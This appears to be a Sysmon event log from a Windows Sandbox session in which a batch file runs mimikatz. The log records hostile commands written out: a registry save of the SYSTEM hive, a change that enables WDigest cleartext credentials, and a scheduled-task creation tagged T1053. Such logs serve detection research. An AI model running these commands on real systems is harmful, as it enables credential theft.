<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.1420340Z'/><EventRecordID>20</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.125</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6000-000000000200}</Data><Data Name='ProcessId'>4352</Data><Data Name='Image'>C:\Users\WDAGUtilityAccount\Desktop\mimikatz.exe</Data><Data Name='ImageLoaded'>\\VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}\os\Windows\System32\logoncli.dll</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='Hashes'>-</Data><Data Name='Signed'>failed: Invalid hash</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>-</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.1577728Z'/><EventRecordID>21</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.156</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6000-000000000200}</Data><Data Name='ProcessId'>4352</Data><Data Name='Image'>C:\Users\WDAGUtilityAccount\Desktop\mimikatz.exe</Data><Data Name='ImageLoaded'>\\VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}\os\Windows\System32\vaultcli.dll</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='Hashes'>-</Data><Data Name='Signed'>failed: Invalid hash</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>-</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.1590961Z'/><EventRecordID>22</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.156</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6000-000000000200}</Data><Data Name='ProcessId'>4352</Data><Data Name='Image'>C:\Users\WDAGUtilityAccount\Desktop\mimikatz.exe</Data><Data Name='ImageLoaded'>\\VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}\os\Windows\System32\wintrust.dll</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='Hashes'>-</Data><Data Name='Signed'>failed: Invalid hash</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>-</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.3216426Z'/><EventRecordID>23</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.313</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6000-000000000200}</Data><Data Name='ProcessId'>4352</Data><Data Name='Image'>C:\Users\WDAGUtilityAccount\Desktop\mimikatz.exe</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.3746488Z'/><EventRecordID>24</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.369</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6100-000000000200}</Data><Data Name='ProcessId'>4388</Data><Data Name='Image'>C:\Windows\System32\whoami.exe</Data><Data Name='FileVersion'>10.0.19041.1 (WinBuild.160101.0800)</Data><Data Name='Description'>whoami - displays logged on user information</Data><Data Name='Product'>MicrosoftR WindowsR Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>whoami.exe</Data><Data Name='CommandLine'>whoami</Data><Data Name='CurrentDirectory'>C:\Users\WDAGUtilityAccount\Desktop\</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data><Data Name='LogonGuid'>{6c5fe7fc-5cf2-666a-f483-030000000000}</Data><Data Name='LogonId'>0x383f4</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88</Data><Data Name='ParentProcessGuid'>{6c5fe7fc-5cf8-666a-4d00-000000000200}</Data><Data Name='ParentProcessId'>4184</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\cmd.exe /c C:\Users\WDAGUtilityAccount\Desktop\SandboxFiles\install_and_run.bat</Data><Data Name='ParentUser'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.4377692Z'/><EventRecordID>25</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.433</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6200-000000000200}</Data><Data Name='ProcessId'>4572</Data><Data Name='Image'>C:\Windows\System32\xcopy.exe</Data><Data Name='FileVersion'>10.0.19041.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Extended Copy Utility</Data><Data Name='Product'>MicrosoftR WindowsR Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>XCOPY.EXE</Data><Data Name='CommandLine'>xcopy  C:\Users\WDAGUtilityAccount\Desktop\SandboxFiles . /H /Y</Data><Data Name='CurrentDirectory'>C:\Users\WDAGUtilityAccount\Desktop\</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data><Data Name='LogonGuid'>{6c5fe7fc-5cf2-666a-f483-030000000000}</Data><Data Name='LogonId'>0x383f4</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=39FBFD3AF58238C6F9D4D408C9251FF5,SHA256=269EB0728413654856F4B2EE1FA7838CD69672EBC11BAED4CAA63F58C2DF5823,IMPHASH=1EFFE65A4F251E4AE9FA8551F9FCDABB</Data><Data Name='ParentProcessGuid'>{6c5fe7fc-5cf8-666a-4d00-000000000200}</Data><Data Name='ParentProcessId'>4184</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\cmd.exe /c C:\Users\WDAGUtilityAccount\Desktop\SandboxFiles\install_and_run.bat</Data><Data Name='ParentUser'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.4823302Z'/><EventRecordID>26</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.469</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6200-000000000200}</Data><Data Name='ProcessId'>4572</Data><Data Name='Image'>C:\Windows\system32\xcopy.exe</Data><Data Name='TargetFilename'>C:\Users\WDAGUtilityAccount\Desktop\1.bat</Data><Data Name='CreationUtcTime'>2024-06-13 02:44:08.718</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.4937742Z'/><EventRecordID>27</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.484</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6200-000000000200}</Data><Data Name='ProcessId'>4572</Data><Data Name='Image'>C:\Windows\system32\xcopy.exe</Data><Data Name='TargetFilename'>C:\Users\WDAGUtilityAccount\Desktop\install_and_run.bat</Data><Data Name='CreationUtcTime'>2024-06-13 02:44:18.484</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.5077690Z'/><EventRecordID>28</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>EXE</Data><Data Name='UtcTime'>2024-06-13 02:44:18.500</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6200-000000000200}</Data><Data Name='ProcessId'>4572</Data><Data Name='Image'>C:\Windows\system32\xcopy.exe</Data><Data Name='TargetFilename'>C:\Users\WDAGUtilityAccount\Desktop\mimikatz.exe</Data><Data Name='CreationUtcTime'>2024-06-13 02:44:08.703</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.5440030Z'/><EventRecordID>29</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>EXE</Data><Data Name='UtcTime'>2024-06-13 02:44:18.531</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6200-000000000200}</Data><Data Name='ProcessId'>4572</Data><Data Name='Image'>C:\Windows\system32\xcopy.exe</Data><Data Name='TargetFilename'>C:\Users\WDAGUtilityAccount\Desktop\Sysmon64.exe</Data><Data Name='CreationUtcTime'>2024-06-13 02:44:08.656</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.6008094Z'/><EventRecordID>30</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.595</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6300-000000000200}</Data><Data Name='ProcessId'>4576</Data><Data Name='Image'>C:\Windows\System32\reg.exe</Data><Data Name='FileVersion'>10.0.19041.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Registry Console Tool</Data><Data Name='Product'>MicrosoftR WindowsR Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>reg.exe</Data><Data Name='CommandLine'>reg  save HKLM\SYSTEM C:\system.save</Data><Data Name='CurrentDirectory'>C:\Users\WDAGUtilityAccount\Desktop\</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data><Data Name='LogonGuid'>{6c5fe7fc-5cf2-666a-f483-030000000000}</Data><Data Name='LogonId'>0x383f4</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC</Data><Data Name='ParentProcessGuid'>{6c5fe7fc-5cf8-666a-4d00-000000000200}</Data><Data Name='ParentProcessId'>4184</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\cmd.exe /c C:\Users\WDAGUtilityAccount\Desktop\SandboxFiles\install_and_run.bat</Data><Data Name='ParentUser'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.7856472Z'/><EventRecordID>31</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.784</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6400-000000000200}</Data><Data Name='ProcessId'>3100</Data><Data Name='Image'>C:\Windows\System32\reg.exe</Data><Data Name='FileVersion'>10.0.19041.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Registry Console Tool</Data><Data Name='Product'>MicrosoftR WindowsR Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>reg.exe</Data><Data Name='CommandLine'>reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</Data><Data Name='CurrentDirectory'>C:\Users\WDAGUtilityAccount\Desktop\</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data><Data Name='LogonGuid'>{6c5fe7fc-5cf2-666a-f483-030000000000}</Data><Data Name='LogonId'>0x383f4</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC</Data><Data Name='ParentProcessGuid'>{6c5fe7fc-5cf8-666a-4d00-000000000200}</Data><Data Name='ParentProcessId'>4184</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\cmd.exe /c C:\Users\WDAGUtilityAccount\Desktop\SandboxFiles\install_and_run.bat</Data><Data Name='ParentUser'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.7963172Z'/><EventRecordID>32</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2024-06-13 02:44:18.781</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6400-000000000200}</Data><Data Name='ProcessId'>3100</Data><Data Name='Image'>C:\Windows\system32\reg.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential</Data><Data Name='Details'>DWORD (0x00000001)</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.8684792Z'/><EventRecordID>33</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.859</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6500-000000000200}</Data><Data Name='ProcessId'>4736</Data><Data Name='Image'>C:\Windows\System32\schtasks.exe</Data><Data Name='FileVersion'>10.0.19041.3636 (WinBuild.160101.0800)</Data><Data Name='Description'>Task Scheduler Configuration Tool</Data><Data Name='Product'>MicrosoftR WindowsR Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>schtasks.exe</Data><Data Name='CommandLine'>schtasks  /create /tn "MyTask" /tr "notepad.exe" /sc once /st 10:45 /f</Data><Data Name='CurrentDirectory'>C:\Users\WDAGUtilityAccount\Desktop\</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data><Data Name='LogonGuid'>{6c5fe7fc-5cf2-666a-f483-030000000000}</Data><Data Name='LogonId'>0x383f4</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=D4DA03B7BB20B7E4F1B762A365D4DD4F,SHA256=9A80453518078BADF0679B0CF30F50A83163E5264A2665C6052CC27F168C50F2,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05</Data><Data Name='ParentProcessGuid'>{6c5fe7fc-5cf8-666a-4d00-000000000200}</Data><Data Name='ParentProcessId'>4184</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\cmd.exe /c C:\Users\WDAGUtilityAccount\Desktop\SandboxFiles\install_and_run.bat</Data><Data Name='ParentUser'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.9186537Z'/><EventRecordID>34</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1053</Data><Data Name='UtcTime'>2024-06-13 02:44:18.906</Data><Data Name='ProcessGuid'>{6c5fe7fc-2e64-666b-0c00-000000000200}</Data><Data Name='ProcessId'>564</Data><Data Name='Image'>C:\Windows\system32\svchost.exe</Data><Data Name='TargetFilename'>C:\Windows\System32\Tasks\MyTask</Data><Data Name='CreationUtcTime'>2024-06-13 02:44:18.906</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
